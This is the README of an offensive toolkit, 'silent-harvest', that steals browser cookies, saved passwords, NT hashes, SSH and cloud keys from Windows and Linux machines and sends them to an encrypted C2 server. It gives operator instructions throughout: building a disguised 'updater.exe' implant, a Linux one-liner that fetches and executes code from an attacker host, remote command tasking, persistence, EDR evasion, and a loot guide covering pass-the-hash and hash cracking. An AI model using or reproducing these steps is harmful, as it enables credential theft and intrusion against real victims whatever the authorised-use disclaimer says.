<div align="center">

```
███████╗██╗██╗     ███████╗███╗   ██╗████████╗    ██╗  ██╗ █████╗ ██████╗ ██╗   ██╗███████╗███████╗████████╗███████╗██████╗
██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝    ██║  ██╗██╔══██╗██╔══██╗██║   ██╗██╔════╝██╔════╝╚══██╔╝██╔════╝██╔══██╗
███████╗██║██║     █████╗  ██╔██╗ ██║   ██║       ███████║███████╗██████╔╝██║   ██║█████╗  ███████╗   ██║   █████╗  ██████╔╝
╚════██║██║██║     ██╔══╝  ██ ╚██╗██║   ██║       ██╔══██║██╔══██║██╔══██╗╚╗ ██╔╝██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
███████║██║███████╗███████╗██║ ╚████║   ██║       ██║  ██║██║  ██║██║  ██╗ ╚████╔╝ ███████╗███████╗   ██║   ███████╗██║  ██║
╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

**Cross-platform credential & cookie harvesting toolkit — stealthy by design.**

[![CI](https://github.com/AsHfIEXE/silent-harvest/actions/workflows/ci.yml/badge.svg)](../../actions/workflows/ci.yml)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue)](#)
[![Python](https://img.shields.io/badge/python-3.9%20%7C%203.12%20%7C%203.13-3776ab)](#)
[![.NET](https://img.shields.io/badge/implant-.NET%20Framework%204.x%20%20(in--box%20csc)-512bd4)](#)
[![Crypto](https://img.shields.io/badge/exfil-AES--256--GCM%20%2B%20HKDF--SHA256-red)](#)
[![License](https://img.shields.io/badge/license-authorized--research--only-lightgrey)](#license)
[![Repo](https://img.shields.io/badge/repo-private-important)](#)

Zero-dependency payloads · encrypted dead-drop C2 with tasking & persistence ·
full offline unlock chain through Chrome 157 app-bound encryption (flag 4)

</div>

---

> ## ⚠️ Disclaimer
>
> **This toolkit is offensive security software.** It harvests credentials,
> session cookies, and secrets from the systems it runs on and exfiltrates
> them to an operator-controlled server.
>
> - Use it **only on systems you own or are explicitly authorized to test**
>   (your lab, engagements with written scope, red-team engagements).
> - Unauthorized use against third-party systems is illegal in most
>   jurisdictions (e.g., CFAA, Computer Misuse Act, BDICT §57).
> - The operators of this repository assume **no liability** and provide the
>   code **as-is, with no warranty**. You are solely responsible for what you
>   run it against.
> - If you are a defender: [`docs/TECHNIQUES.md`](docs/TECHNIQUES.md) is
>   written for you — every technique here ships with its detection angle.

---

## Contents

- [What it is](#what-it-is)
- [Why it's stealthy](#why-its-stealthy)
- [Quick start](#quick-start) — operator · Windows target · Linux target
- [Repository layout](#repository-layout)
- [Building the Windows implant](#building-the-windows-implant)
- [Linux implant](#linux-implant)
- [Running the C2](#running-the-c2) — collector · tasking · persistence
- [Parsing & offline unlock](#parsing--offline-unlock)
- [What gets collected](#what-gets-collected)
- [Using the loot](#using-the-loot)
- [Container format (SHV1)](#container-format-shv1)
- [Capabilities & limitations](#capabilities--limitations)
- [Operator console (TUI)](#operator-console-tui)
- [Testing & CI](#testing--ci)
- [Operational notes](#operational-notes)

## What it is

Three components, one pipeline:

```
 implant (target)                                       operator
 ┌──────────────────────────────────────────┐          ┌──────────────────────────────────────┐
 │ WINDOWS (C#, in-box csc.exe, no SDK)     │          │ server/collector.py   C2 :8443      │
 │  • SeBackup + NtOpenKeyEx(BACKUP_RESTORE)│  HTTPS/  │   POST /gate   ← SHV1 loot container │
 │    + RegQueryMultipleValuesW  (rare APIs)│  HTTP,   │   GET  /beacon → SHV1 tasking        │
 │  • SAM/LSA secrets · bootkey · NL$ cache │  AEAD    │ server/c2ctl.py    queue/host mgmt  │
 │  • esentutl /y /vss hive copies          │  only    │ server/parse_loot.py  → creds       │
 │  • browsers: DPAPI keys, locked DBs via  │ ───────► │ server/offline_unlock.py             │
 │    NtReadFile offset reads (zero-        │          │   → NT hashes · DPAPI · ABE v20      │
 │    disturbance handle duplication)       │          │   → plaintext cookies+passwords      │
 │  • keys/vault/wifi/screenshot/EDR recon  │          │ server/tui.py   operator console     │
 │                                          │          │                                      │
 │ LINUX (single-file py3, stdlib only)     │          │                                      │
 │  • browsers · ssh/aws/kube/cloud keys    │          │                                      │
 │  • keyring · history  (root: shadow,wifi)│          │                                      │
 └──────────────────────────────────────────┘          └──────────────────────────────────────┘
```

**Verified end-to-end on a live Windows 11 / Chrome 157 box:** one elevated
run → 7 accounts of NT hashes, LSA secrets, machine+user DPAPI masterkeys,
CNG SystemKeys, Wi-Fi PSKs — then fully offline: **all 1,625 app-bound (v20)
cookies and all 678 Google-Password-Manager passwords decrypted to plaintext**,
no password, no injection, no COM calls.

## Why it's stealthy

| property | how |
|---|---|
| no hooked APIs for the core technique | SAM/LSA reads go through `NtOpenKeyEx(REG_OPTION_BACKUP_RESTORE)` + bulk `RegQueryMultipleValuesW` — not the `RegQueryValueEx`/`RegSaveKey` tripwires EDR trains on |
| no disk writes | everything is staged in memory; the only temp files are esentutl hive copies (deleted after read) |
| locked browser DBs without killing anything | handle duplication + `NtReadFile` at explicit byte offsets — the browser's shared file pointer is never touched, so the owner's I/O stays consistent (captured DBs pass `PRAGMA integrity_check`) |
| no browser process termination | nothing ever kills or injects into the browser — no crash reports, no session restore prompts |
| windowless, silent failure | release build is GUI-subsystem, zero console, zero dialogs; every helper process spawns `CreateNoWindow` |
| opaque C2 | single AEAD blob per check-in; tasking is delivered encrypted with the same PSK — nothing readable on the wire |
| stealthy persistence | user-level only (Run key + scheduled task), staged under `%APPDATA%\Microsoft`, self-configuring |
| PSK never on disk in logs | build log prints a sha256 fingerprint only; the key lives XOR+base64 inside the binary |

Honest limits: the Windows implant is .NET (CLR visibility is higher than
native — P/Invoke-first code keeps a native port mechanical), and an
EDR-grade host will still see process/registry-handle *events*; the design
goal is quiet, not invisible. Full defender view: `docs/TECHNIQUES.md`.

## Quick start

**1 — Operator: start the C2**

```bash
cd server
python collector.py --port 8443 --psk SECRET --auth opstoken \
                    --allow 10.0.0.0/8 --loot-dir ../loot
# optionally TLS: --tls-cert cert.pem --tls-key key.pem
```

**2 — Windows target: build & deliver (payload needs nothing on the box)**

```bat
build.bat /name updater.exe /c2 http://YOUR.HOST:8443/gate /auth opstoken /pin cert:AB12..
:: deliver build\updater.exe — runs on any Windows 8+ with zero prerequisites
```

**3 — Linux target: one-liner, no install**

```bash
python3 -c "import urllib.request;exec(urllib.request.urlopen('http://YOUR.HOST:9000/sh_harvest.py').read())"
# or fetch & run with args:
python3 sh_harvest.py --c2 http://YOUR.HOST:8443/gate --psk SECRET --auth opstoken
```

**4 — Watch loot land, task implants, unlock everything**

```bash
python server/tui.py                                    # live console (watch mode)
python server/c2ctl.py queue HOST-user --exec "whoami"  # remote exec → returns as loot
python server/parse_loot.py                             # bundle → creds/report
python server/offline_unlock.py --bundle loot/HOST-...  # hives+ABE → plaintext
```

## Repository layout

| path | contents |
|---|---|
| `implant/` | Windows implant — C# 5, compiles with the **in-box** `csc.exe` (no SDK/toolchain on target) |
| `linux/sh_harvest.py` | Linux implant — single-file Python 3, stdlib only, ctypes-libcrypto fallback |
| `server/collector.py` | C2: loot receiver, beacon/tasking queue, host registry, TLS, auth/allowlist/rate-limit |
| `server/c2ctl.py` | operator CLI — hosts, task queueing (`--stages` / `--exec` / `--persist`) |
| `server/parse_loot.py` | bundle → report/creds/Netscape cookies; `--redact`/`--prune-days`/`--shred` |
| `server/offline_unlock.py` | the offline chain: secretsdump → DPAPI → ABE flag-1..4 → plaintext |
| `server/v20_live_unlock.py` | live-session variant (lsass impersonation, when you're on the box) |
| `server/tui.py` | operator console — browse/parse/shred, live watch |
| `server/shcrypto.py` | SHV1 container reference implementation (Python) |
| `build.bat` · `tools/` | build (bakes C2/PSK/pin/auth) + config generation + build driver |
| `test/` | round-trip tests, malformed-input fuzz, C#↔Python interop |
| `docs/TECHNIQUES.md` | technique details, ATT&CK map, detection guidance (defender-facing) |
| `docs/COMPATIBILITY.md` | per-OS / per-privilege compatibility matrix |
| `.github/workflows/ci.yml` | CI: windows+ubuntu × py3.9/3.12/3.13 |

## Building the Windows implant

```bat
cd silent-harvest
build.bat /name updater.exe /c2 http://YOUR.HOST:8443/gate /auth opstoken /pin cert:AB12..
:: or the python driver (bypasses cmd quoting quirks):
python tools\do_build.py --c2 http://YOUR.HOST:8443/gate --name updater.exe
```

| arg | default | meaning |
|---|---|---|
| `-name` / `/name` | `appsetup.exe` | release binary name |
| `-c2` / `/c2` | `http://127.0.0.1:8443/gate` | collector endpoint baked into the binary |
| `-psk` / `/psk` | **random per build** | pre-shared key; omitted → strong random key written to `server\psk.txt`; the build log shows only a sha256 **fingerprint** |
| `-pin` / `/pin` | *(verify)* | `cert:HEX` pin the exact server cert sha256 (self-signed collectors); `any` = accept anything (**debug only**) |
| `-auth` / `/auth` | *(none)* | `X-SH-Auth` token (required when the collector runs `--auth`) |
| `-release-only` | — | skip the debug console build |

Outputs: `build/sh_debug.exe` (console, stage logging) and `build/<name>`
(GUI, silent). **Treat built binaries and `server/psk.txt` as secret
material** — the embedded PSK is XOR+base64 (defeats `strings`, not RE).

## Linux implant

No build step; stdlib-only, AES-GCM via `cryptography` when importable else
ctypes→libcrypto (OpenSSL ships everywhere).

```bash
python3 sh_harvest.py --selftest                       # crypto+container roundtrip
python3 sh_harvest.py --c2 http://H:8443/gate --psk SECRET [-v]
python3 sh_harvest.py --c2 https://H:8443/gate --pin cert:AB.. --auth tok
SH_C2=http://H:8443/gate SH_PSK=SECRET python3 sh_harvest.py
```

Delivery: memory-backed one-liner (see quick start), a launcher, or freeze
to standalone ELF with PyInstaller on your build box. Stage filters:
`brow`, `keys`, `keyring`; `--home DIR` for lab homes.

## Running the C2

### Collector

```bash
python server/collector.py --port 8443 --psk SECRET --auth opstoken \
    --allow 10.0.0.0/8,192.168.1.0/24 --rate 60 --max-body 128 \
    [--tls-cert cert.pem --tls-key key.pem] --loot-dir ../loot
```

| control | default | meaning |
|---|---|---|
| `--auth TOKEN` | off | constant-time `X-SH-Auth` requirement |
| `--allow CIDRS` | any | source network allowlist |
| `--max-body MB` / `--rate N` | 128 / 60 | body cap · requests per IP per minute |
| `--tls-cert/--tls-key` | off | TLS front end (pair with `/pin cert:` on implants) |
| `--psk` → `SH_PSK` → `psk.txt` → dev key | — | PSK resolution order (0600 on POSIX) |

Every access decision appends to `<loot-dir>/access.log`; bundles failing
AEAD auth are rejected and **never stored**. Loot layout:
`loot/<HOST>-<USER>-<TS>/{bundle.bin, manifest.json, parts/…}` + `index.jsonl`.

### Beacon tasking & loop mode

`GET /beacon?id=HOST-user` registers the host in `hosts.json` (last-seen,
beacons, elevated, persistence state) and pops one queued task, delivered as
an **SHV1-encrypted** container — tasking is as opaque as loot.

```bash
python server/c2ctl.py hosts                          # roster, online status
python server/c2ctl.py queue HOST-user --stages brow,key
python server/c2ctl.py queue HOST-user --exec "systeminfo"   # output → task:exec.txt loot
python server/c2ctl.py queue HOST-user --persist
python server/c2ctl.py tasks / unqueue HOST-user [id]
```

Implant side:

| flag | meaning |
|---|---|
| `--loop N --jitter J` | beacon every N±J seconds, apply tasks (`stages` re-scopes the harvest, `exec` runs hidden with output exfiltrated, `persist` installs) |
| `--cycles K` | bound the loop (testing) |
| `--persist [--pname X]` | stage to `%APPDATA%\Microsoft\<X>.exe`, register hourly scheduled task (logon trigger where permitted) + HKCU Run key; the staged copy self-detects and enters loop mode with no args |

Unelevated, no service installs, no UAC. Verified live: queue → beacon →
remote-exec output returned as loot; persistence install/query/delete
round-trip.

## Parsing & offline unlock

```bash
python server/parse_loot.py [--bundle f.bin] [dir] [--redact] [--prune-days N] [--shred all]
python server/offline_unlock.py --bundle loot/<dir> [--password X]
```

`parse_loot.py` writes `report.txt`, `creds.json`, Netscape `cookies_*.txt`,
optional secretsdump output; 0600 perms, redaction and shredding controls.

`offline_unlock.py` is the full offline chain — **encrypted now, plaintext
later**, no live session needed:

1. hives → impacket secretsdump → **NT hashes** (pass-the-hash ready), LSA
   secrets, cached logons, `DPAPI_SYSTEM` machine/user keys
2. machine DPAPI masterkeys — `S-1-5-18` root via `dpapi_machinekey`,
   `S-1-5-18\User` (what ABE outers reference) via `dpapi_userkey`
3. user masterkeys — SAM NT hash, or `--password` (Hello-PIN / MS-account
   boxes where the local hash is blank)
4. `os_crypt.encrypted_key` → v10 AES key
5. **ABE flag 1–4** (incl. Chrome 157 flag-4): `APPB` blob → outer (machine
   masterkey) → inner (user masterkey) → `[hdr][path][flag|enc_key|iv|ct|tag]`
   → CNG `SystemKeys` file + universal CNG entropy → `KDBM` key material →
   AES-CBC(zero IV) → XOR constant → **v20 master key**
6. mass decrypt of every v10/v20 cookie **and saved password** (incl. the
   synced `Login Data For Account` GPM store) → `unlocked/cookies_all.txt`,
   `unlocked/passwords.txt`

Requirements: `pip install cryptography impacket` (venv).

## What gets collected

| stage | Windows (unelevated) | Windows (elevated) | Linux (user) | Linux (root) |
|---|---|---|---|---|
| registry technique | bootkey components, OS info | + SAM `F`/`V` per RID, LSA secrets, NL$1-10 cache | — | — |
| hives | — | SAM/SECURITY/SYSTEM via `esentutl /y /vss` | — | — |
| chromium browsers | Local State + DPAPI-unwrapped key, Cookies, **Login Data + Login Data For Account (GPM)**, Web Data, History, localStorage; locked DBs via handle-dup | + VSS fallback | os_crypt via `secret-tool` (v1+v2) or `peanuts` | same |
| firefox / thunderbird | key4.db / logins.json / logins.db per profile | same | same | same |
| keys & cloud | `.ssh .aws .kube .azure gcloud .netrc .git-credentials .docker .npmrc .pypirc` | same + SystemKeys | ssh/gpg/aws/kube/azure/gcloud/netrc/git/docker/npm/pypi, history | + `/etc/shadow`, NetworkManager PSKs, crontabs |
| vault & recon | DPAPI masterkeys, Credential Manager, FileZilla, RDP hints, PuTTY sessions | + machine masterkeys (S-1-5-18 all scopes) | keyring files | same |
| extras | Wi-Fi profile names / **cleartext PSKs (elevated)**, screenshot, EDR/AV inventory | | | |

Browsers: Chrome, Edge, Brave, Chromium, Vivaldi, Opera — every profile.
Part naming (`b:`, `ff:`, `hive:`, `linux:`, `win:`, `task:`) drives the
parser; see `docs/COMPATIBILITY.md`.

## Using the loot

| loot class | usable? | how |
|---|---|---|
| **browser cookies + saved passwords** (post offline-unlock) | ✅ immediately | `unlocked/cookies_all.txt` imports into curl/Burp/cookie-editors; `passwords.txt` is url⇄user⇄pass |
| **Wi-Fi PSKs** | ✅ immediately | connect any device (`netsh wlan add profile` / type it in) |
| **SSH keys** | ✅ immediately | `ssh -i key user@host`; `known_hosts` maps internal targets |
| **localStorage JWT/bearer tokens** | ✅ immediately | `curl -H "Authorization: Bearer …"` — not app-bound |
| **kube / docker / npm / pypi / netrc / git creds** | ✅ immediately | parser decodes docker `auths` (base64 user:pass), FileZilla XOR, etc. |
| **NT hashes** | ⚠️ pass-the-hash | `impacket-psexec -hashes :<hash>` or crack (`hashcat -m 1000`) |
| **shadow hashes** | ⚠️ crack offline | `hashcat -m 7400/1800/500` → SSH/sudo |
| **DPAPI masterkeys + vault blobs** | ⚠️ offline stage | NT hash or password → every CredMan/vault secret decrypts |
| history / RDP hints / PuTTY / screenshot / EDR list | ✅ intel & opsec | targeting map, what the user was doing, what you're facing |
| **DBSC-enrolled sessions** (Chrome ≥145 sites) | ❌ replay | cookie decrypts but fails the cross-device DBSC handshake |

## Container format (SHV1)

```
"SHV1" | ver:u16 | salt:16 | nonce:12 | ct_len:u64 | ciphertext | tag:16
```

- key = HKDF-SHA256(ikm=PSK, salt, info=`"silent-harvest/v1"`, 32B)
- AES-256-GCM, AAD = first 6 header bytes
- plaintext = `u32 manifest_len` + JSON manifest + concatenated parts

Only 6 bytes are visible on the wire. Reference implementations:
`server/shcrypto.py` (Python) and `implant/Crypto.cs` (raw CNG) —
byte-identical, interop-tested in CI.

## Capabilities & limitations

| area | status |
|---|---|
| Registry technique (SAM/LSA/bootkey) | ✅ implemented; privileged targets need elevation (kernel privilege-checks backup-intent opens); unelevated runs report honest `ACCESS_DENIED` statuses |
| Hive → NT hashes / DCC2 / LSA secrets | ✅ automatic with impacket; hives always stored for offline work |
| Chromium v10 (Windows pre-ABE; most Linux) | ✅ end-to-end plaintext |
| Chromium **v20 app-bound, flags 1–4 (Chrome 127→157+)** | ✅ **offline chain implemented end-to-end** — elevated capture + `offline_unlock.py`; verified on Chrome 157 flag-4 (1,625 cookies, 678 GPM passwords) |
| Synced GPM store (`Login Data For Account`) | ✅ captured + decrypted with the v20 key |
| GPM **passkeys** | ❌ WebAuthn/TPM-sync scoped — only `keychain_identifier` refs are visible; true for every public stealer too |
| Firefox classic (key4.db a11) | ✅ end-to-end |
| Firefox new LoginStore (`logins.db`) | `secFields` exfiltrated raw (Rust sync-store format) |
| Locked Cookies DB while browser runs | ✅ handle duplication, zero disturbance to the owner's I/O |
| CLR visibility | ⚠️ .NET implant is more EDR-visible than native; P/Invoke-first keeps a native port mechanical |

## Operator console (TUI)

```bash
python server/tui.py          # full-screen console, 2s live watch
```

Bundle table (host/user/platform/elev/parts/size/parsed), detail view with
parts tree, pagers for report/manifest/creds/access-log, in-TUI parse /
redact / shred. Pure stdlib — Windows conhost/Windows Terminal and any POSIX
terminal; colors auto-disable on non-tty or `NO_COLOR`; `--demo` renders a
headless frame for CI.

## Testing & CI

```bash
python server/shcrypto.py       # container + PSK rejection
python test/test_fuzz.py        # 25 malformed-input cases
python test/synth_firefox.py    # key4 ASN.1 / a11 / 3DES roundtrip
python test/synth_chromium.py   # chromium v10 (DPAPI+GCM) roundtrip
python test/synth_linux.py      # linux implant end-to-end (synthetic home)
python linux/sh_harvest.py --selftest
python test/interop_cs.py       # windows: csc build → run → python decrypt
```

CI (`.github/workflows/ci.yml`): `windows-latest` + `ubuntu-latest` ×
Python 3.12/3.13, plus a 3.9 leg (`ubuntu-22.04`, where 3.9 still exists) —
including a Windows job that builds the implant with the in-box `csc.exe`,
runs it, and decrypts its container in Python, with a guard that fails the
build if the PSK ever leaks into build output.

## Operational notes

- **PSK discipline:** one PSK per operation; builds default to fresh random
  keys (fingerprint-only logging). The binary embeds the key — the binary is
  secret material.
- **TLS:** verify by default; `cert:` pinning for self-signed collectors;
  `any` is debug-only and removes MITM protection. The AEAD layer is
  independent of transport security.
- **Exposure:** internet-facing collectors should run `--auth` + `--allow`
  behind a TLS terminator.
- **Failure behavior:** unreachable C2 → dead-drop in temp, exit 2; rejected
  auth → 401 + dead-drop; partial privilege → per-stage graceful degradation;
  wrong PSK → rejected, never stored.
- **Loot lifecycle:** ciphertext at rest → parse `--redact` for reports →
  `--prune-days` retention → `--shred` disposal.
- **Rebuild after moving:** always run `build.bat` / `tools/do_build.py`
  from the repo root (writes `implant/Config.cs` + `server/psk.txt`).

## License

Provided as-is for **authorized security testing and research only**.
No warranty. See the [disclaimer](#-disclaimer).
